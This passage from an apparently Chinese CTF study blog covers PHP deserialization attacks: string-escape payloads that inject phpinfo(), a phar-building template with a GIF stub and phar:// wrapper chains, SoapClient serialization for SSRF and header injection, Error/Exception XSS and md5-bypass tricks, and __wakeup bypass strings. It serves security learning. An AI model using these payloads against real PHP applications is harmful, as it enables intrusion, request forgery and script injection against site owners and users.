double-quoted-string">";s:1:"</span>p<span class="token string double-quoted-string">";s:1:"</span>a<span class="token string double-quoted-string">";s:3:"</span>cmd<span class="token string double-quoted-string">";s:10:"</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string double-quoted-string">";&#125;"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"echo 'nono~';"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//过滤前</span>


<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"k"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">70</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"hackhackhackhackhackhackhackhackhackhackhackhackhackhack"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">46</span><span class="token punctuation">:</span><span class="token string double-quoted-string">";s:1:"</span>p<span class="token string double-quoted-string">";s:1:"</span>a<span class="token string double-quoted-string">";s:3:"</span>cmd<span class="token string double-quoted-string">";s:10:"</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string double-quoted-string">";&#125;"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"echo 'nono~';"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//过滤后</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时是没有执行成功的，那是因为<code>&quot;;s:1:&quot;p&quot;;s:1:</code>变成了<code>&quot;;s:1:&quot;p&quot;;s:46:</code> ，p的长度变成了两位数，因此需要缩进的字符串需要再加一个，也就是需要15个admin。</p>
<p>payload:</p>
<pre class="line-numbers language-none"><code class="language-none">?k&#x3D;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&amp;p&#x3D;;s:1:&quot;p&quot;;s:1:&quot;a&quot;;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<blockquote>
<p>OK兄弟萌，我们总结一下：</p>
<p>字符<strong>增多</strong>的情况下，需要构造的关键字个数是：从可控变量的值的最后一个引号(包括引号)一直到最后大括号。</p>
<p>​				O:4:”Test”:2:{s:1:”k”;s:5:”admin”;s:3:”cmd”;s:10:”phpinfo();”;}</p>
<p>​                                                 				      “;s:3:”cmd”;s:10:”phpinfo();”;}</p>
<p>字符<strong>减少</strong>的情况下，需要构造的关键字个数是：第一个可控变量值的最后一个引号(包括引号)一直到第二个可控变量的值前的冒号。</p>
<p>​				O:4:”Test”:3:{s:1:”k”;s:5:”admin”;s:1:”p”;s:1:”a”;s:3:”cmd”;s:10:”phpinfo();”;}</p>
<p>​             														  “;s:1:”p”;s:1:</p>
</blockquote>
<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面 (seebug.org)</a></p>
<h2 id="Phar基础"><a href="#Phar基础" class="headerlink" title="Phar基础"></a>Phar基础</h2><blockquote>
<p>Phar是将 php文件 打包 而成的一种 <strong>压缩文档</strong>。</p>
</blockquote>
<p>Phar文件由四个部分组成（<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/phar.fileformat.ingredients.php">PHP: Manual</a>）：</p>
<ol>
<li>a stub</li>
<li>a manifest describing the contents</li>
<li>the file contents</li>
<li>[optional] a signature for verifying Phar integrity (phar file format only)</li>
</ol>
<p>a <strong>stub</strong>【<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/phar.fileformat.stub.php">PHP: Manual</a>】</p>
<blockquote>
<p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
</blockquote>
<p>a <strong>manifest</strong> describing the contents【<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/phar.fileformat.manifestfile.php">PHP: Manual</a>】</p>
<blockquote>
<p>phar文件本质上是一种压缩文件，其中每个被压缩文件的<strong>权限、属性</strong>等信息都放在这部分。这部分还会以&#x3D;&#x3D;<strong>序列化</strong>&#x3D;&#x3D;的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
</blockquote>
<p>the file <strong>contents</strong></p>
<blockquote>
<p>被压缩文件的内容。</p>
</blockquote>
<p>[optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)【<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/phar.fileformat.signature.php">PHP: Manual</a>】</p>
<blockquote>
<p>签名，放在文件末尾。</p>
</blockquote>
<p>Phar文件内容有序列化数据必然会有反序列化操作，php一大部分的<a target="_blank" rel="noopener" href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
<p><img src="/.io//img/2.png"></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>利用条件：</p>
<ol>
<li>phar文件要能够<u>上传</u>到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
</ol>
<p>Phar文件生成利用模板：</p>
<blockquote>
<p>构造phar之时需要先要将 <strong>php.ini</strong> 中的 <strong>phar.readonly</strong> 选项设置为 <strong>Off</strong> </p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//后缀名必须是phar</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//启动写入操作</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub，增加gif文件头</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义meta-data存入manifest</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
    <span class="token comment">//签名自动计算</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//停止写入请求</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>生成文件后，可以修改phar文件的文件名及其后缀，不影响phar协议解析</p>
</blockquote>
<p>然后将Phar文件上传，利用phar协议解析。</p>
<p><em>其它的协议配合phar协议</em></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=phar://phar.phar</span>
php<span class="token punctuation">:</span><span class="token comment">//filter/resource=phar://phar.phar</span>
compress<span class="token operator">.</span>zlib<span class="token punctuation">:</span><span class="token comment">//phar://phar.phar</span>
compress<span class="token operator">.</span>bzip<span class="token punctuation">:</span><span class="token comment">//phar://phar.phar</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h1 id="原生类的利用"><a href="#原生类的利用" class="headerlink" title="原生类的利用"></a>原生类的利用</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9293">PHP 原生类的利用小结 - 先知社区 (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/247647">浅谈PHP原生类反序列化-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p>在CTF中常使用到的原生类有这几类<br>1、Error<br>2、Exception<br>3、SoapClient<br>4、DirectoryIterator<br>5、SimpleXMLElement<br>下面针对这几个类来进行总结。</p>
<h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.soapclient.php">PHP: SoapClient - Manual</a></p>
<blockquote>
<p>soap是webServer的三要素之一(SOAP、WSDL、UDDI)</p>
<p>WSDL用来描述如何访问具体的接口<br>UUDI用来管理、分发、查询webServer<br>SOAP是连接web服务和客户端的接口</p>
</blockquote>
<p>简单地说，SOAP 是一种简单的基于 XML 的协议，它使应用程序通过 <strong>HTTP</strong> 来交换信息。</p>
<p>SoapClient类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。</p>
<p>该类的构造函数如下：</p>
<pre class="line-numbers language-none"><code class="language-none">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>第一个参数是用来指明是否是wsdl模式，将该值设为 null 则表示非wsdl模式。</li>
<li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项。<ul>
<li>location是要将请求发送到的SOAP服务器的URL</li>
<li>uri 是SOAP服务的目标命名空间。</li>
</ul>
</li>
</ul>
<blockquote>
<p>第二个参数允许设置user_agent选项来设置请求的user-agent头</p>
</blockquote>
<p>【GET】</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"http://127.0.0.1"</span><span class="token punctuation">;</span><span class="token comment">//这后面是可以带参数的</span>
<span class="token variable">$attack</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token variable">$target</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'user_agent'</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"aaa\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n"</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'uri'</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$attack</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>【POST】</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://127.0.0.1'</span><span class="token punctuation">;</span>
<span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cmd=123'</span><span class="token punctuation">;</span>
<span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string single-quoted-string">'X-Forwarded-For: 127.0.0.1'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'Cookie: PHPSESSID=123'</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$attack</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
  <span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token variable">$target</span><span class="token punctuation">,</span>
  <span class="token string single-quoted-string">'user_agent'</span><span class="token operator">=></span> <span class="token string double-quoted-string">"aaa\r\nContent-Type: application/x-www-form-urlencoded\r\n"</span><span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\r\nContent-Length: "</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\r\n\r\n"</span><span class="token operator">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span>
  <span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span> <span class="token string double-quoted-string">"123"</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$attack</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Error-x2F-Exception"><a href="#Error-x2F-Exception" class="headerlink" title="Error&#x2F;Exception"></a>Error&#x2F;Exception</h2><p><strong>Error</strong></p>
<p>使用条件：</p>
<ul>
<li>php7版本</li>
<li>开启报错的情况下</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//xss</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 因为有不可见字符，所以url编码一下</span>
<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>

<span class="token comment">// 测试</span>
<span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>Exception</strong></p>
<p>使用条件：</p>
<ul>
<li>适用于php5、7版本</li>
<li>开启报错的情况下</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 因为有不可见字符，所以url编码一下</span>
<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>

<span class="token comment">// 测试</span>
<span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>他们妙用不仅限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。</p>
<p>在来看看下一个例子：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\r\n\r\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">Error<span class="token punctuation">:</span> payload in <span class="token operator">/</span>usercode<span class="token operator">/</span>file<span class="token operator">.</span>php<span class="token punctuation">:</span><span class="token number">2</span>
Stack trace<span class="token punctuation">:</span>
<span class="token comment">#0 &#123;main&#125;</span>

Error<span class="token punctuation">:</span> payload in <span class="token operator">/</span>usercode<span class="token operator">/</span>file<span class="token operator">.</span>php<span class="token punctuation">:</span><span class="token number">2</span>
Stack trace<span class="token punctuation">:</span>
<span class="token comment">#0 &#123;main&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可见，报错信息一模一样。那么md5和sha后的结果也肯定是一样的。可以绕过md5强比较。</p>
<h1 id="绕过trick"><a href="#绕过trick" class="headerlink" title="绕过trick"></a>绕过trick</h1><h2 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h2><p>低版本</p>
<ul>
<li>PHP5 &lt; 5.6.25</li>
<li>PHP7 &lt; 7.0.10</li>
</ul>
<p>把对象原来属性值改成比原来的大就行。</p>
<blockquote>
<p>修改前:O:6:”sercet”:<strong>1</strong>:{s:12:”%00sercet%00file”;s:8:”flag.php”;}<br>修改后:O:6:”sercet”:<strong>2</strong>:{s:12:”%00sercet%00file”;s:8:”flag.php”;} </p>
</blockquote>
<hr>
<p>高版本</p>
<p><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=81153">PHP :: Bug #81153 :: unserialize error calls __destruct before __wakeup</a></p>
<ul>
<li>7.4.x -7.4.30</li>
<li>8.0.x</li>
</ul>
<p>当反序列化的字符串中包含字符串长度错误的变量名时，反序列化会继续进行，但会在调用 <strong>wakeup 之前调用</strong> destruct() 函数。这样就可以绕过 __wakeup()。</p>
<blockquote>
<p>修改前:O:1:”C”:1:{s:1:”c”;O:1:”D”:1:{s:4:”flag”;b:1;}}<br>修改后:<br>O:1:”C”:1:{s:1:”c”;O:1:”D”:0:{s:4:”flag”;b:1;}}<br>O:1:”C”:1:{s:1:”c”;O:1:”D”:2:{s:4:”flag”;b:1;}}<br>O:1:”C”:1:{s:1:”c”;O:1:”D”:1:{s:0:”flag”;b:1;}}<br>O:1:”C”:1:{s:1:”c”;O:1:”D”:1:{s:4:”flag”;b:1;};}<br>O:1:”C”:1:{s:1:”c”;O:1:”D”:0:{};N;}</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=81151">PHP :: Bug #81151 :: bypass __wakeup</a></p>
<p>把O改成C，但是{}内不能有任何字符</p>
<p>C代表这个类实现了serializeable接口，serializeable不支持wakeup，就绕过去了</p>
<blockquote>
<p>O:1:”E”:0:{}<br>C:1:”E”:0:{}</p>
</blockquote>

        </div>
        <div class="top-div">
          <ol class="top-box"><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="top-box-text">session反序列化</span></a></li><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="top-box-text">反序列化字符串逃逸</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%AD%97%E7%AC%A6%E5%A2%9E%E5%A4%9A"><span class="top-box-text">字符增多</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%AD%97%E7%AC%A6%E5%87%8F%E5%B0%91"><span class="top-box-text">字符减少</span></a></li></ol></li><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="top-box-text">phar反序列化</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#Phar%E5%9F%BA%E7%A1%80"><span class="top-box-text">Phar基础</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%88%A9%E7%94%A8"><span class="top-box-text">利用</span></a></li></ol></li><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8"><span class="top-box-text">原生类的利用</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#SoapClient"><span class="top-box-text">SoapClient</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#Error-x2F-Exception"><span class="top-box-text">Error&#x2F;Exception</span></a></li></ol></li><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#%E7%BB%95%E8%BF%87trick"><span class="top-box-text">绕过trick</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#wakeup%E7%BB%95%E8%BF%87"><span class="top-box-text">wakeup绕过</span></a></li></ol></li></ol>
        </div>
      </div>
    </div>

    
      <div class="next-post">
        <a class="purple-link" href="/2023/01/03/ctfshownodejs/">
          <h3 class="post-title">
            下一篇：ctfshow_web入门_nodejs
          </h3>
        </a>
      </div>
    
  </div>




<footer>
<div class="site-footer">
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
  
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
  
  
  
  
  
  
</div>
</footer>


      </div>
      
    <script src="/js/jquery.min.js"></script>
    <script src="/js/jquery.fancybox.min.js"></script>


<script id="hexo-configurations">
    window.theme_config = {"image":{"lazyload_enable":false}};
    window.is_post = true;
  </script>

<script src="/js/main.js"></script>





    </div>
  </body>
</html>

